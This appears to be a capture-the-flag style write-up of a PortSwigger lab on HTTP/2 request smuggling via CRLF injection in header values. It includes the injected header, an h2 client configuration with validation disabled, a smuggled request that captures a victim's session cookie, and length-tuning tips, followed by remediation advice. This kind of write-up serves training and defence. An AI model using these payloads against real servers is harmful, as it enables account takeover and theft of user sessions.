---
layout: post
title: "PortSwigger: HTTP/2 Request Smuggling via CRLF Injection"
date: 2027-09-03 09:00:00 -0500
categories: [Web Security, Request Smuggling]
tags: [portswigger, request-smuggling, http2, crlf-injection, desync, downgrade, session-hijack, web]
---

## Lab Summary

The front-end speaks **HTTP/2** to the browser but downgrades every request to **HTTP/1.1**
for the back-end. It strips a *real* `Transfer-Encoding` header — but it fails to sanitise
raw `\r\n` (CRLF) bytes inside other header **values**. By smuggling a `Transfer-Encoding`
header *inside another header's value*, we desync the back-end, capture the next user's full
request (including their session cookie), and take over their account. **CWE-444** — inconsistent
interpretation of HTTP requests.

## Why HTTP/2 makes this possible

In HTTP/2 a message's length is part of the binary framing, so the HTTP/1.1 length headers
(`Content-Length`, `Transfer-Encoding`) carry no meaning on the wire. When a proxy downgrades
HTTP/2 to HTTP/1.1 it serialises your headers back into text. A naïve serialiser copies header
**values verbatim** — so any `\r\n` you hide in a value becomes a real line break in the
back-end's view, letting you inject an entire extra header.

The textbook HTTP/2 smuggle (**H2.TE**) just adds a `transfer-encoding: chunked` header. This
lab blocks that — the front-end strips a genuine TE header. The bypass is to smuggle it inside
a value:

```
foo: bar\r\ntransfer-encoding: chunked
```

After downgrade the back-end reads:

```
foo: bar
transfer-encoding: chunked
```

## The exploit

`curl` and Burp both refuse to put raw CRLF in an HTTP/2 header value, so we use Python's
`h2` library with validation disabled:

```python
from h2.connection import H2Connection
from h2.config import H2Configuration

config = H2Configuration(
    client_side=True, header_encoding="utf-8",
    validate_outbound_headers=False, normalize_outbound_headers=False,
)
```

We send an HTTP/2 `POST /` with the CRLF-injected `foo` header, and a DATA-frame body that is a
chunked terminator followed by a **smuggled second request**:

```
0\r\n\r\n
POST / HTTP/1.1\r\n
Host: <lab>\r\n
Cookie: session=<MY-OWN-SESSION>\r\n
Content-Length: 829\r\n
Content-Type: application/x-www-form-urlencoded\r\n
\r\n
search=
```

The `0\r\n\r\n` ends our request for the back-end; the rest sits buffered on the shared
connection as a new `POST /`. Two design choices make the capture work:

- It carries **our own** session cookie, so whatever it captures is stored in **our** account.
- It declares `Content-Length: 829` — far more than the tiny `search=` body — so the back-end
  keeps reading. The next victim request on that pooled connection gets appended into our
  `search=` value and stored in our **recent searches**.

Reading the home page back reveals the victim's verbatim request:

```
... cookie: victim-fingerprint=...; secret=...; session=yzOTpFsHtmRzYWrm73M7zKMReBilgn9O
```

`GET /my-account` with that session cookie logs us in as **carlos** — solved.

## The tuning gotcha

The stored search holds `Content-Length − 7` bytes (the `search=` prefix is 7 bytes). The
victim's request is ~822 bytes with the session cookie at the very end (~byte 818):

| Content-Length | Outcome |
|---|---|
| 800 | 793 bytes captured → session truncated to **7/32 chars** |
| 1200 | smuggled POST needs a *second* request to fill → stalls → nothing fresh stored |
| **~829** | fills from exactly **one** victim request → **full 32-char session** captured |

It's a timing race (the victim browses ~every 15s), so resend a few times until a full capture
lands. A poll `GET /` may return **500** on a desynced socket — read the body anyway and retry.

## Remediation

- On HTTP/2 → HTTP/1.1 downgrade, **reject or strip CR/LF inside header values** (forbidden in
  HTTP/2 header values by spec).
- Re-derive the back-end message length from the HTTP/2 frame; never forward a client-supplied
  `Transfer-Encoding`.
- Ideally, speak HTTP/2 end-to-end so no downgrade desync can occur.
